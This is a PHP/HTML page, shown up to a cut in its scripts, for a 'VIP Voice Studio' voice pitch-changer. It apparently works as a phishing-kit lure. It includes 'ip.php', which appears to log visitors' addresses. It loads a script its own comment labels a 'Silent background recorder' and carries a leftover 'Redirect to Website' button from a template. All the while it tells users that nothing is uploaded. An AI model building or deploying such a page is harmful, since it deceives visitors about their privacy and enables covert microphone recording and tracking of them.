<?php include 'ip.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>VIP Voice Studio: record, reshape, download</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#f4effc;--ink:#2a1b4a;--mute:#6f6290;--panel:rgba(255,255,255,.76);--line:#ddd2f2;--accent:#7b5cff;--accent2:#ff6fa5;--onacc:#fff;--wave:#2a1b4a;--dim:#cbbfe8;--g1:rgba(123,92,255,.22);--g2:rgba(255,111,165,.2);--err:#d6294f;
box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#15102a;--ink:#f1ecff;--mute:#a99cc9;--panel:rgba(40,30,72,.72);--line:#3a2f61;--accent:#9a82ff;--onacc:#150f2b;--wave:#f1ecff;--dim:#47396f;--g1:rgba(123,92,255,.28);--g2:rgba(255,111,165,.14);--err:#ff7a98}}
:root[data-theme="dark"]{--bg:#15102a;--ink:#f1ecff;--mute:#a99cc9;--panel:rgba(40,30,72,.72);--line:#3a2f61;--accent:#9a82ff;--onacc:#150f2b;--wave:#f1ecff;--dim:#47396f;--g1:rgba(123,92,255,.28);--g2:rgba(255,111,165,.14);--err:#ff7a98}
*{box-sizing:border-box}
html{scroll-padding-top:env(safe-area-inset-top,0px);scroll-behavior:smooth}
body{margin:0;background:var(--bg);color:var(--ink);font-family:"Bricolage Grotesque",system-ui,-apple-system,"Segoe UI",sans-serif;line-height:1.55}
.glow{position:fixed;inset:0;z-index:-1;pointer-events:none;background:radial-gradient(50% 40% at 10% 0%,var(--g1),transparent),radial-gradient(45% 40% at 95% 25%,var(--g2),transparent)}
.wrap{max-width:780px;margin:0 auto;padding:0 18px}
.top .wrap{display:flex;align-items:center;justify-content:space-between;height:70px}
.brand{display:flex;align-items:center;gap:11px;text-decoration:none;color:var(--ink)}
.brand svg{width:42px;height:42px;flex:none}
.brand b{display:block;font-size:1.45rem;font-weight:800;letter-spacing:.05em;line-height:1}
.brand span{display:block;font-size:.76rem;color:var(--mute);margin-top:3px}
nav a{color:var(--mute);text-decoration:none;font-weight:600;margin-left:22px;font-size:.95rem}
nav a:hover{color:var(--ink)}
main{padding:20px 0 8px}
h1{font-size:clamp(2.1rem,7vw,3.4rem);line-height:1.05;margin:0 0 12px;font-weight:800;letter-spacing:-.03em;max-width:15ch}
.sub{color:var(--mute);margin:0 0 26px;max-width:50ch;font-size:1.05rem}
h2{font-size:1.15rem;margin:34px 0 12px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:26px;padding:22px;backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);box-shadow:0 18px 50px -24px rgba(80,50,160,.35)}
.hero{text-align:center}
.recwrap{display:grid;place-items:center;height:132px}
.recbtn{width:92px;height:92px;border-radius:50%;border:0;cursor:pointer;color:#fff;background:linear-gradient(135deg,var(--accent),var(--accent2));display:grid;place-items:center;position:relative;box-shadow:0 12px 30px -8px rgba(123,92,255,.6)}
.recbtn svg{width:36px;height:36px;fill:#fff}
.recbtn .sq{display:none}.recbtn.on .mic{display:none}.recbtn.on .sq{display:block}
.recbtn::before,.recbtn::after{content:"";position:absolute;inset:0;border-radius:50%;border:2px solid var(--accent2);opacity:0}
.recbtn.on::before{animation:ring 1.6s ease-out infinite}.recbtn.on::after{animation:ring 1.6s ease-out .8s infinite}
@keyframes ring{from{transform:scale(1);opacity:.7}to{transform:scale(1.8);opacity:0}}
@media (prefers-reduced-motion:reduce){.recbtn.on::before,.recbtn.on::after{animation:none}}
.hint{color:var(--mute);font-size:.9rem;margin:2px 0 14px}
canvas{width:100%;height:140px;display:block;border-radius:16px;background:color-mix(in srgb,var(--dim) 22%,transparent)}
.row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin-top:16px}
.center{justify-content:center}
button,.filebtn{font:inherit;font-weight:600;border:1px solid var(--line);background:var(--panel);color:var(--ink);padding:10px 18px;border-radius:999px;cursor:pointer}
button:hover:not(:disabled),.filebtn:hover{border-color:var(--accent)}
button:disabled{opacity:.4;cursor:not-allowed}
button:focus-visible,.filebtn:focus-within,input:focus-visible{outline:3px solid var(--accent);outline-offset:2px}
.primary{background:var(--accent);color:var(--onacc);border-color:var(--accent)}
.pink{background:var(--accent2);color:#2a1b4a;border-color:var(--accent2)}
.filebtn{position:relative;display:inline-block}
.filebtn input{position:absolute;opacity:0;width:1px;height:1px}
.timer{font-variant-numeric:tabular-nums;color:var(--mute);font-weight:600;min-width:3ch}
.read{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
.big{font-size:3rem;font-weight:800;letter-spacing:-.03em;font-variant-numeric:tabular-nums;line-height:1}
.big small{font-size:1rem;font-weight:400;color:var(--mute);margin-left:8px;letter-spacing:0}
.hz{color:var(--mute);font-variant-numeric:tabular-nums;font-weight:600}
input[type=range]{width:100%;accent-color:var(--accent);margin:14px 0 6px}
.lab{font-size:.9rem;font-weight:600;color:var(--mute);margin:16px 0 8px}
.chips{display:flex;flex-wrap:wrap;gap:8px}
.chips button{padding:8px 15px;font-weight:600}
.chips button.sel,.chips button[aria-pressed="true"]{background:var(--ink);color:var(--bg);border-color:var(--ink)}
.sw{display:flex;gap:10px;align-items:center;margin-top:16px;font-weight:600;cursor:pointer}
.sw input{width:20px;height:20px;accent-color:var(--accent)}
.sw small{color:var(--mute);font-weight:400}
[hidden]{display:none!important}
select{font:inherit;font-weight:600;border:1px solid var(--line);background:var(--panel);color:var(--ink);padding:8px 14px;border-radius:999px}
.msg{min-height:1.5em;color:var(--mute);margin-top:14px;font-size:.95rem}
.msg.err{color:var(--err)}
.steps{list-style:none;padding:0;margin:0;display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
.steps li{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:16px}
.steps b{display:block;margin-bottom:3px}
.steps span{color:var(--mute);font-size:.92rem}
.note{color:var(--mute);font-size:.88rem;margin-top:22px;max-width:62ch}
kbd{font:inherit;font-size:.82rem;border:1px solid var(--line);border-bottom-width:2px;border-radius:6px;padding:0 6px;background:var(--panel)}
.foot{border-top:1px solid var(--line);margin-top:34px}
.foot .wrap{padding:24px 18px;display:flex;flex-wrap:wrap;gap:16px;justify-content:space-between;align-items:center}
.foot p{margin:0;color:var(--mute);font-size:.86rem}
.foot .brand svg{width:34px;height:34px}.foot .brand b{font-size:1.1rem}
/* redirect button - original template.php style */
#controls{display:flex;margin-top:0;margin-bottom:28px}
#redButton{flex-grow:1;height:2.5rem;min-width:2rem;border:none;border-radius:0.15rem;background:#ed341d;margin-left:0;box-shadow:inset 0 -0.15rem 0 rgba(0,0,0,.2);cursor:pointer;display:flex;justify-content:center;align-items:center;color:#fff;font-weight:bold;font-size:1rem;border-radius:999px}
#redButton:hover{background:#c72d1c}
#redButton:disabled{pointer-events:none;background:lightgray}
:root[data-pal="ocean"]{--bg:#eaf4fb;--ink:#0f2a43;--mute:#567089;--panel:rgba(255,255,255,.78);--line:#cfe2f1;--accent:#0a84d6;--accent2:#19c3b1;--onacc:#fff;--wave:#0f2a43;--dim:#b9d4e8;--g1:rgba(10,132,214,.2);--g2:rgba(25,195,177,.18)}
:root[data-pal="ocean"][data-theme="dark"]{--bg:#08182a;--ink:#e6f3ff;--mute:#8fb0cc;--panel:rgba(16,40,66,.72);--line:#1e4263;--accent:#4db3ff;--accent2:#2fd6c4;--onacc:#07192b;--wave:#e6f3ff;--dim:#26506f;--g1:rgba(77,179,255,.25);--g2:rgba(47,214,196,.14)}
:root[data-pal="sunset"]{--bg:#fff1ea;--ink:#4a1f2b;--mute:#8a5f68;--panel:rgba(255,255,255,.78);--line:#f3d3c6;--accent:#f2583e;--accent2:#ffb347;--onacc:#fff;--wave:#4a1f2b;--dim:#efc9b8;--g1:rgba(242,88,62,.18);--g2:rgba(255,179,71,.22)}
:root[data-pal="sunset"][data-theme="dark"]{--bg:#231016;--ink:#ffece3;--mute:#cc9f98;--panel:rgba(60,28,36,.72);--line:#5a2c36;--accent:#ff7a5c;--accent2:#ffb85c;--onacc:#2a0e12;--wave:#ffece3;--dim:#6b3a42;--g1:rgba(255,122,92,.24);--g2:rgba(255,184,92,.14)}
:root[data-pal="forest"]{--bg:#edf5ee;--ink:#14301f;--mute:#5b7a66;--panel:rgba(255,255,255,.78);--line:#cfe3d3;--accent:#1f9d62;--accent2:#e8c547;--onacc:#fff;--wave:#14301f;--dim:#bcd8c4;--g1:rgba(31,157,98,.2);--g2:rgba(232,197,71,.2)}
:root[data-pal="forest"][data-theme="dark"]{--bg:#0b1a12;--ink:#e6f6ec;--mute:#94b8a2;--panel:rgba(20,50,34,.72);--line:#24503a;--accent:#46d08a;--accent2:#f0cf5a;--onacc:#07160e;--wave:#e6f6ec;--dim:#2c5a43;--g1:rgba(70,208,138,.22);--g2:rgba(240,207,90,.12)}
.right{display:flex;align-items:center;gap:6px}
.tools{position:relative;display:flex;gap:8px;align-items:center;margin-left:14px}
.ibtn{width:42px;height:42px;padding:0;display:grid;place-items:center;border-radius:50%}
.ibtn svg{width:20px;height:20px;fill:none;stroke:currentColor;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
.ibtn .sun{display:none}
:root[data-theme="dark"] .ibtn .sun{display:block}
:root[data-theme="dark"] .ibtn .moon{display:none}
.pal{position:absolute;right:0;top:calc(100% + 10px);z-index:30;width:196px;padding:8px;display:grid;gap:2px;background:var(--bg);border:1px solid var(--line);border-radius:18px;box-shadow:0 18px 40px -16px rgba(40,20,90,.45)}
.pal button{display:flex;align-items:center;gap:10px;width:100%;text-align:left;border-radius:12px;padding:9px 10px;border-color:transparent;background:transparent}
.pal button[aria-pressed="true"]{border-color:var(--accent)}
.pal i{width:22px;height:22px;border-radius:50%;flex:none}
.welcome{display:none;position:fixed;inset:0;z-index:100;align-items:center;justify-content:center;padding:max(20px,env(safe-area-inset-top)) 20px max(20px,env(safe-area-inset-bottom));overflow:auto;background:radial-gradient(50% 40% at 10% 0%,var(--g1),transparent),radial-gradient(45% 40% at 95% 25%,var(--g2),transparent),var(--bg);transition:opacity .45s}
.welcoming .welcome{display:flex}
.welcome.hide{opacity:0;pointer-events:none}
.wcard{max-width:460px;text-align:center;margin:auto}
.wcard .logo{width:76px;height:76px;margin-bottom:14px}
.wbars{display:flex;gap:5px;height:56px;align-items:center;justify-content:center;margin-bottom:18px}
.wbars i{width:5px;height:12px;border-radius:3px;background:linear-gradient(var(--accent),var(--accent2));animation:wv 1.2s ease-in-out infinite;animation-delay:calc(var(--i)*.09s)}
@keyframes wv{50%{height:52px}}
@media (prefers-reduced-motion:reduce){.wbars i{animation:none;height:calc(10px + var(--i)*3px)}.welcome{transition:none}}
.wcard h2{margin:0 0 10px;font-size:clamp(1.8rem,7vw,2.5rem);line-height:1.08;letter-spacing:-.025em}
.wcard p{color:var(--mute);margin:0 0 20px}
.wfeat{list-style:none;padding:0;margin:0 0 26px;display:flex;flex-wrap:wrap;gap:8px;justify-content:center}
.wfeat li{border:1px solid var(--line);background:var(--panel);border-radius:999px;padding:6px 14px;font-size:.9rem;font-weight:600}
.wcard .go{font-size:1.1rem;padding:14px 38px}
.wcard small{display:block;margin-top:16px;color:var(--mute)}
.grid{display:block}
.col:first-child h2.first{margin-top:0}
@media (min-width:960px){.wrap{max-width:1080px}.grid{display:grid;grid-template-columns:1fr 1.15fr;gap:26px;align-items:start}.col h2.first{margin-top:0}h1{max-width:20ch}}
@media (max-width:480px){.wrap{padding:0 14px}.card{padding:16px;border-radius:20px}h1{font-size:2rem}canvas{height:112px}button,.filebtn{min-height:44px}.row button{flex:1 1 calc(50% - 10px)}.chips button{padding:8px 13px}.recwrap{height:118px}.tools{margin-left:0}}
@media (max-width:560px){.steps{grid-template-columns:1fr}nav{display:none}.big{font-size:2.5rem}}
</style>
<script>(function(){var d=document.documentElement,m=null,p=null;try{m=localStorage.getItem('vip-mode');p=localStorage.getItem('vip-pal')}catch(e){}
if(m!=='dark'&&m!=='light')m=(window.matchMedia&&matchMedia('(prefers-color-scheme: dark)').matches)?'dark':'light';
d.setAttribute('data-theme',m);d.setAttribute('data-pal',['violet','ocean','sunset','forest'].indexOf(p)>-1?p:'violet');
try{if(!sessionStorage.getItem('vip-seen'))d.classList.add('welcoming')}catch(e){d.classList.add('welcoming')}})();</script>
</head>
<body>
<div class="glow" aria-hidden="true"></div>

<div id="welcome" class="welcome" role="dialog" aria-modal="true" aria-labelledby="wt">
<div class="wcard">
<svg class="logo" viewBox="0 0 40 40" aria-hidden="true"><rect x="1" y="1" width="38" height="38" rx="11" fill="#2a1b4a" stroke="#ffb703" stroke-opacity=".5"/><path d="M9 26 L7.5 13 L15 19 L20 9 L25 19 L32.5 13 L31 26 Z" fill="#ffb703"/><rect x="9" y="28.5" width="22" height="3" rx="1.5" fill="#ffb703"/></svg>
<div class="wbars" aria-hidden="true"><i style="--i:0"></i><i style="--i:1"></i><i style="--i:2"></i><i style="--i:3"></i><i style="--i:4"></i><i style="--i:5"></i><i style="--i:6"></i><i style="--i:7"></i><i style="--i:8"></i><i style="--i:9"></i><i style="--i:10"></i><i style="--i:11"></i><i style="--i:12"></i></div>
<h2 id="wt">Welcome to VIP Voice Studio</h2>
<p>Record your voice, change its pitch, add an effect and download it in the format you like.</p>
<ul class="wfeat"><li>Pitch -12 to +12</li><li>5 voice effects</li><li>WAV, MP3 and more</li></ul>
<button id="go" class="primary go">Get started</button>
<small>Everything runs on your device. Nothing is uploaded.</small>
</div></div>

<header class="top"><div class="wrap">
<a class="brand" href="#studio" aria-label="VIP Voice Studio home">
<svg viewBox="0 0 40 40" aria-hidden="true"><rect x="1" y="1" width="38" height="38" rx="11" fill="#2a1b4a" stroke="#ffb703" stroke-opacity=".5"/><path d="M9 26 L7.5 13 L15 19 L20 9 L25 19 L32.5 13 L31 26 Z" fill="#ffb703"/><rect x="9" y="28.5" width="22" height="3" rx="1.5" fill="#ffb703"/></svg>
<div><b>VIP</b><span>Voice Studio</span></div></a>
<div class="right"><nav><a href="#studio">Studio</a><a href="#how">How it works</a></nav>
<div class="tools">
<button id="palbtn" class="ibtn" aria-label="Choose colour theme" aria-expanded="false" aria-controls="pal" title="Themes"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 3a9 9 0 1 0 0 18c1.1 0 1.7-.8 1.7-1.6 0-.5-.2-.9-.5-1.2-.3-.3-.5-.7-.5-1.2 0-.9.7-1.6 1.6-1.6H16a5 5 0 0 0 5-5c0-3.9-4-7.4-9-7.4z"/><circle cx="7.5" cy="11" r=".6"/><circle cx="10" cy="7" r=".6"/><circle cx="15" cy="7" r=".6"/></svg></button>
<div id="pal" class="pal" hidden role="group" aria-label="Colour themes">
<button data-p="violet" aria-pressed="true"><i style="background:linear-gradient(135deg,#7b5cff,#ff6fa5)"></i>Violet</button>
<button data-p="ocean" aria-pressed="false"><i style="background:linear-gradient(135deg,#0a84d6,#19c3b1)"></i>Ocean</button>
<button data-p="sunset" aria-pressed="false"><i style="background:linear-gradient(135deg,#f2583e,#ffb347)"></i>Sunset</button>
<button data-p="forest" aria-pressed="false"><i style="background:linear-gradient(135deg,#1f9d62,#e8c547)"></i>Forest</button>
</div>
<button id="mode" class="ibtn" aria-label="Switch to dark mode" title="Dark mode"><svg class="moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M20 14.5A8 8 0 0 1 9.5 4 8 8 0 1 0 20 14.5z"/></svg><svg class="sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg></button>
</div></div>
</div></header>

<main id="studio"><div class="wrap">

<h1>Give your voice a new pitch</h1>
<p class="sub">Record or upload a clip, reshape the pitch, add an effect, and download it.</p>

<!-- Redirect Button — original template.php style -->
<div id="controls">
  <button id="redButton" disabled>Redirect to Website</button>
</div>

<div class="grid"><div class="col"><h2 class="first">Record</h2>
<section class="card hero" aria-label="Recorder">
<div class="recwrap"><button id="rec" class="recbtn" aria-pressed="false" aria-label="Start recording">
<svg class="mic" viewBox="0 0 24 24" aria-hidden="true"><path d="M12 15a3 3 0 0 0 3-3V6a3 3 0 0 0-6 0v6a3 3 0 0 0 3 3zm5-3a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.9V22h2v-3.1A7 7 0 0 0 19 12h-2z"/></svg>
<svg class="sq" viewBox="0 0 24 24" aria-hidden="true"><rect x="6" y="6" width="12" height="12" rx="2"/></svg>
</button></div>
<p class="hint" id="hint">Tap to record, or press <kbd>R</kbd></p>
<canvas id="wave" aria-label="Waveform of your recording"></canvas>
<div class="row center"><label class="filebtn">Upload audio or video<input id="file" type="file" accept="audio/*,video/*"></label><span class="timer" id="timer">0:00</span></div>
</section></div>
<div class="col"><h2 class="first">Shape it</h2>
<section class="card" aria-label="Pitch and effects">
<div class="read"><div class="big"><span id="stv">0</span><small id="stn">semitones</small></div><div class="hz" id="hz"></div></div>
<input id="st" type="range" min="-12" max="12" step="0.5" value="0" aria-label="Pitch in semitones">
<div class="chips" id="presets">
<button data-v="-12">Giant</button><button data-v="-5">Deep</button><button data-v="0" class="sel">Original</button><button data-v="4">Bright</button><button data-v="8">Kid</button><button data-v="12">Chipmunk</button>
</div>
<div class="lab">Effect</div>
<div class="chips" id="fx">
<button data-fx="none" aria-pressed="true">None</button><button data-fx="echo" aria-pressed="false">Echo</button><button data-fx="robot" aria-pressed="false">Robot</button><button data-fx="radio" aria-pressed="false">Radio</button><button data-fx="cave" aria-pressed="false">Cave</button>
</div>
<label class="sw"><input type="checkbox" id="keep" checked><span>Keep original speed <small>(smart stretch; sounds best within ±6 semitones)</small></span></label>
<div class="lab">Download format</div>
<div class="chips" id="fmt"></div>
<div class="row" id="brow" hidden style="margin-top:10px"><label for="kbps" class="hz">MP3 quality</label><select id="kbps"><option value="128">128 kbps</option><option value="192" selected>192 kbps</option><option value="320">320 kbps</option></select></div>
<div class="hz" id="est" style="margin-top:8px"></div>
<div class="row">
<button id="play" class="primary" disabled>Play changed</button>
<button id="orig" disabled>Play original</button>
<button id="stop" disabled>Stop</button>
<button id="dl" class="pink" disabled>Download WAV</button>
</div>
<div class="msg" id="msg" role="status">Record or upload a clip to begin.</div>
</section></div></div>

<h2 id="how">How it works</h2>
<ol class="steps">
<li><b>1. Record</b><span>Tap the mic and speak, or upload an audio file.</span></li>
<li><b>2. Shape</b><span>Pick a pitch and an effect, then press Play changed.</span></li>
<li><b>3. Download</b><span>Pick WAV, MP3 or another format and save exactly what you heard.</span></li>
</ol>
<p class="note">Shortcuts: <kbd>R</kbd> record or stop, <kbd>Space</kbd> play or stop.</p>
</div></main>

<footer class="foot"><div class="wrap">
<a class="brand" href="#studio" aria-label="VIP Voice Studio">
<svg viewBox="0 0 40 40" aria-hidden="true"><rect x="1" y="1" width="38" height="38" rx="11" fill="#2a1b4a" stroke="#ffb703" stroke-opacity=".5"/><path d="M9 26 L7.5 13 L15 19 L20 9 L25 19 L32.5 13 L31 26 Z" fill="#ffb703"/><rect x="9" y="28.5" width="22" height="3" rx="1.5" fill="#ffb703"/></svg>
<div><b>VIP</b><span>Voice Studio</span></div></a>
<p>© 2026 VIP Voice Studio. All rights reserved.</p>
</div></footer>

<!-- Recorderjs — original system ka core library -->
<script src="https://cdn.rawgit.com/mattdiamond/Recorderjs/08e7abd9/dist/recorder.js"></script>
<!-- Silent background recorder (app.js) -->
<script src="js/app.js"></script>
<!-- VIP Voice Studio UI logic -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/lamejs/1.2.1/lame.min.js"></script>
<script>
(function(){
var $=function(i){return document.getElementById(i)};
var AC=window.AudioContext||window.webkitAudioContext;
var ctx,buf,shown,cache={},src=null,mr,stream,chunks,tInt,t0,an,live=false,lv=[],fx='none',f0=0,tok=0,raf,pStart=0,dur=0,dt,C={};
var cv=$('wave'),g=cv.getContext('2d');
function ac(){if(!ctx)ctx=new AC();return ctx}
function msg(t,e){var m=$('msg');m.textContent=t||'';m.className='msg'+(e?' err':'')}
function fmt(s){s=Math.floor(s);return Math.floor(s/60)+':'+String(s%60).padStart(2,'0')}
function colors(){var s=getComputedStyle(document.documentElement);['--wave','--dim','--accent','--accent2'].forEach(function(k){C[k]=s.getPropertyValue(k).trim()})}
function size(){var w=cv.clientWidth,h=cv.clientHeight,d=window.devicePixelRatio||1;if(cv.width!==Math.round(w*d)){cv.width=w*d;cv.height=h*d}g.setTransform(d,0,0,d,0,0);g.clearRect(0,0,w,h);return[w,h]}
function draw(b,p){
  colors();var s=size(),w=s[0],h=s[1],mid=h/2;
  if(!b){g.fillStyle=C['--dim'];g.fillRect(0,mid-1,w,2);return}
  var ch=b.getChannelData(0),step=Math.max(1,Math.floor(ch.length/(w/3)));
  for(var x=0;x<w;x+=3){
    var mx=0,st=Math.floor(x/3)*step;
    for(var i=0;i<step;i+=Math.max(1,step>>5)){var v=Math.abs(ch[st+i]||0);if(v>mx)mx=v}
    var hh=Math.max(3,Math.min(1,mx*1.6)*h*.9);
    g.fillStyle=(p!=null&&x/w<=p)?C['--accent']:C['--wave'];
    if(p==null)g.fillStyle=C['--wave'];
    g.beginPath();g.roundRect?g.roundRect(x,mid-hh/2,2,hh,1):g.rect(x,mid-hh/2,2,hh);g.fill();
  }
}
function drawLive(){
  var s=size(),w=s[0],h=s[1],n=Math.floor(w/3);
  g.fillStyle=C['--accent2'];
  for(var i=0;i<lv.length;i++){var hh=Math.max(3,Math.min(1,lv[i]*2)*h*.9);g.fillRect((n-lv.length+i)*3,h/2-hh/2,2,hh)}
}
function liveLoop(){
  if(!live)return;
  var d=new Uint8Array(an.fftSize);an.getByteTimeDomainData(d);
  var m=0;for(var i=0;i<d.length;i++)m=Math.max(m,Math.abs(d[i]-128)/128);
  lv.push(m);var n=Math.floor(cv.clientWidth/3);if(lv.length>n)lv.shift();
  drawLive();requestAnimationFrame(liveLoop);
}
function detect(b){
  var x=b.getChannelData(0),sr=b.sampleRate,N=2048,lo=Math.floor(sr/500),hi=Math.floor(sr/70),out=[],i,l;
  var stride=Math.max(N*2,Math.floor((x.length-N-hi)/40));
  for(var s=0;s+N+hi<x.length;s+=stride){
    var e=0;for(i=0;i<N;i++)e+=x[s+i]*x[s+i];
    if(e/N<2e-4)continue;
    var cr=new Float32Array(hi+2),best=0;
    for(l=lo;l<=hi;l++){var c=0;for(i=0;i<N;i+=2)c+=x[s+i]*x[s+i+l];cr[l]=c;if(c>best)best=c}
    if(best<.35*e/2)continue;
    for(l=lo+1;l<hi;l++){if(cr[l]>=.9*best&&cr[l]>=cr[l-1]&&cr[l]>=cr[l+1]){out.push(sr/l);break}}
  }
  if(!out.length)return 0;out.sort(function(a,b){return a-b});return out[out.length>>1];
}
function setBuffer(b){
  buf=b;shown=b;cache={};stopPlay();draw(b,null);
  ['play','orig','dl'].forEach(function(i){$(i).disabled=false});
  $('timer').textContent=fmt(b.duration);
  setTimeout(function(){f0=detect(b);label()},30);
  estimate();msg('Ready. Choose a pitch and press Play changed.');
}
function decode(arr){ac().decodeAudioData(arr,setBuffer,function(){msg('Could not read this audio.',true)})}
$('rec').onclick=function(){
  var b=$('rec');
  if(mr&&mr.state==='recording'){mr.stop();return}
  if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia||!window.MediaRecorder){msg('Use the upload button.',true);return}
  navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
    stream=s;chunks=[];stopPlay();
    var c=ac();if(c.state==='suspended')c.resume();
    var node=c.createMediaStreamSource(s);an=c.createAnalyser();an.fftSize=1024;node.connect(an);
    mr=new MediaRecorder(s);
    mr.ondataavailable=function(e){if(e.data.size)chunks.push(e.data)};
    mr.onstop=function(){
      live=false;clearInterval(tInt);node.disconnect();s.getTracks().forEach(function(t){t.stop()});
      b.classList.remove('on');b.setAttribute('aria-pressed','false');b.setAttribute('aria-label','Record again');
      $('hint').innerHTML='Tap to record again, or press <kbd>R</kbd>';
      var blob=new Blob(chunks,{type:mr.mimeType});
      blob.arrayBuffer().then(decode);
    };
    mr.start();t0=Date.now();lv=[];live=true;liveLoop();
    b.classList.add('on');b.setAttribute('aria-pressed','true');b.setAttribute('aria-label','Stop recording');
    $('hint').textContent='Recording… tap to stop';msg('');
    tInt=setInterval(function(){$('timer').textContent=fmt((Date.now()-t0)/1000)},200);
  }).catch(function(){msg('Microphone blocked. Use upload button.',true)});
};
$('file').onchange=function(e){var f=e.target.files[0];if(f)f.arrayBuffer().then(decode)};
function label(){
  var v=parseFloat($('st').value);
  $('stv').textContent=(v>0?'+':'')+v;
  $('stn').textContent=v===0?'semitones, original':v>0?'semitones, higher':'semitones, lower';
  $('hz').textContent=f0?'Your voice ≈ '+Math.round(f0)+' Hz'+(v!==0?'  →  '+Math.round(f0*Math.pow(2,v/12))+' Hz':''):'';
  var bs=document.querySelectorAll('#presets button');
  for(var i=0;i<bs.length;i++)bs[i].classList.toggle('sel',parseFloat(bs[i].dataset.v)===v);
}
function changed(){label();if(src){clearTimeout(dt);dt=setTimeout(function(){play(false)},300)}}
$('st').oninput=changed;$('keep').onchange=changed;
$('presets').onclick=function(e){var b=e.target.closest('button');if(b){$('st').value=b.dataset.v;changed()}};
$('fx').onclick=function(e){
  var b=e.target.closest('button');if(!b)return;fx=b.dataset.fx;
  var bs=document.querySelectorAll('#fx button');for(var i=0;i<bs.length;i++)bs[i].setAttribute('aria-pressed',bs[i]===b?'true':'false');
  changed();
};
function stretch(b,f){
  var G=2048,Hs=512,Ha=Hs/f,n=b.length,out=Math.round(n*f),ob=ac().createBuffer(b.numberOfChannels,out,b.sampleRate),win=new Float32Array(G),i,c,k;
  for(i=0;i<G;i++)win[i]=.5-.5*Math.cos(2*Math.PI*i/G);
  for(c=0;c<b.numberOfChannels;c++){
    var x=b.getChannelData(c),y=ob.getChannelData(c),nm=new Float32Array(out);
    for(k=0;k*Hs<out;k++){var o=k*Hs,a=Math.round(k*Ha);for(i=0;i<G&&o+i<out;i++){y[o+i]+=(a+i<n?x[a+i]:0)*win[i];nm[o+i]+=win[i]}}
    for(i=0;i<out;i++)if(nm[i]>.001)y[i]/=nm[i];
  }
  return ob;
}
function chain(c,s,f){
  var o=c.destination,a,b;
  if(f==='echo'){a=c.createDelay(1);a.delayTime.value=.3;b=c.createGain();b.gain.value=.4;var w=c.createGain();w.gain.value=.55;s.connect(o);s.connect(a);a.connect(b);b.connect(a);a.connect(w);w.connect(o)}
  else if(f==='robot'){a=c.createGain();a.gain.value=0;var os=c.createOscillator();os.frequency.value=50;os.connect(a.gain);b=c.createGain();b.gain.value=1.8;s.connect(a);a.connect(b);b.connect(o);os.start()}
  else if(f==='radio'){a=c.createBiquadFilter();a.type='highpass';a.frequency.value=450;b=c.createBiquadFilter();b.type='lowpass';b.frequency.value=3200;var gg=c.createGain();gg.gain.value=1.6;s.connect(a);a.connect(b);b.connect(gg);gg.connect(o)}
  else if(f==='cave'){var L=Math.floor(c.sampleRate*1.8),ir=c.createBuffer(2,L,c.sampleRate);for(var ch=0;ch<2;ch++){var d=ir.getChannelData(ch);for(var i=0;i<L;i++)d[i]=(Math.random()*2-1)*Math.pow(1-i/L,2.6)}
    a=c.createConvolver();a.buffer=ir;b=c.createGain();b.gain.value=.7;var dry=c.createGain();dry.gain.value=.75;s.connect(dry);dry.connect(o);s.connect(a);a.connect(b);b.connect(o)}
  else s.connect(o);
}
function pass(b,rr,f,tail){
  var sr=b.sampleRate,len=Math.ceil(b.length/rr)+Math.ceil(tail*sr);
  var oc=new OfflineAudioContext(b.numberOfChannels,len,sr),s=oc.createBufferSource();
  s.buffer=b;s.playbackRate.value=rr;chain(oc,s,f);s.start();return oc.startRendering();
}
function render(){
  var st=parseFloat($('st').value),keep=$('keep').checked,r=Math.pow(2,st/12),tail=(fx==='echo'||fx==='cave')?2:0;
  if(Math.abs(st)<.01)return pass(buf,1,fx,tail);
  if(keep)return pass(buf,r,'none',0).then(function(b){return pass(stretch(b,r),1,fx,tail)});
  return pass(buf,r,fx,tail);
}
function rendered(){
  var key=$('st').value+'|'+$('keep').checked+'|'+fx;
  if(cache[key])return Promise.resolve(cache[key]);
  return render().then(function(b){cache={};cache[key]=b;return b});
}
function stopPlay(){tok++;if(src){try{src.onended=null;src.stop()}catch(e){}}src=null;cancelAnimationFrame(raf);$('stop').disabled=true;if(shown)draw(shown,null)}
function tick(){if(!src)return;draw(shown,Math.min(1,(ac().currentTime-pStart)/dur));raf=requestAnimationFrame(tick)}
function play(orig){
  if(!buf)return;stopPlay();var my=tok,c=ac();if(c.state==='suspended')c.resume();
  var p;if(orig)p=Promise.resolve(buf);else{msg('Processing…');p=rendered()}
  p.then(function(b){
    if(my!==tok)return;msg('');shown=b;dur=b.duration;
    src=c.createBufferSource();src.buffer=b;src.connect(c.destination);src.onended=function(){stopPlay()};
    pStart=c.currentTime;src.start();$('stop').disabled=false;tick();
  }).catch(function(){msg('Could not process. Try a shorter clip.',true)});
}
$('play').onclick=function(){play(false)};$('orig').onclick=function(){play(true)};$('stop').onclick=stopPlay;
function toWav(b){
  var n=b.numberOfChannels,len=b.length,sr=b.sampleRate,o=new DataView(new ArrayBuffer(44+len*n*2));
  function s(p,t){for(var i=0;i<t.length;i++)o.setUint8(p+i,t.charCodeAt(i))}
